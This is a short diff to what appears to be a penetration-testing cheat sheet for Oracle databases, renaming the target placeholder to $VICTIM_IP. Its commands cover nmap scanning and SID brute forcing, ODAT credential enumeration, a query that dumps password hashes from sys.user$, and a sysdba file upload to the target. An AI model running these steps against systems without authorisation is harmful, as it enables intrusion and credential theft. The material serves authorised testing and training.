@@ -1,17 +1,17 @@
 
 ```bash
 # Scan Oracle TNS with Nmap
-sudo nmap -p1521 -sV <target-ip> --open
+sudo nmap -p1521 -sV $VICTIM_IP --open
 
 # Brute Force SID Names
-sudo nmap -p1521 --script oracle-sid-brute <target-ip>
+sudo nmap -p1521 --script oracle-sid-brute $VICTIM_IP
 
 # Use ODAT to Enumerate Oracle Database creds etc 
-./odat.py all -s <target-ip>
+./odat.py all -s $VICTIM_IP
 
 
 # Connect Using SQL*Plus
-sqlplus username/password@<target-ip>/SID
+sqlplus username/password@$VICTIM_IP/SID
 
 # Enumerate Database Info
 select table_name from all_tables;
@@ -21,10 +21,10 @@ select * from user_role_privs;
 select name, password from sys.user$;
 
 # Upload Files (if possible)
-./odat.py utlfile -s <target-ip> -d <SID> -U <user> -P <pass> --sysdba --putFile <localfile> <remotepath> <localfile>
+./odat.py utlfile -s $VICTIM_IP -d <SID> -U <user> -P <pass> --sysdba --putFile <localfile> <remotepath> <localfile>
 ```
 
-### Odat
+### <span style="color:#50FA7B">Odat</span>
 ```bash
 git clone https://github.com/quentinhardy/odat.git
 cd odat/
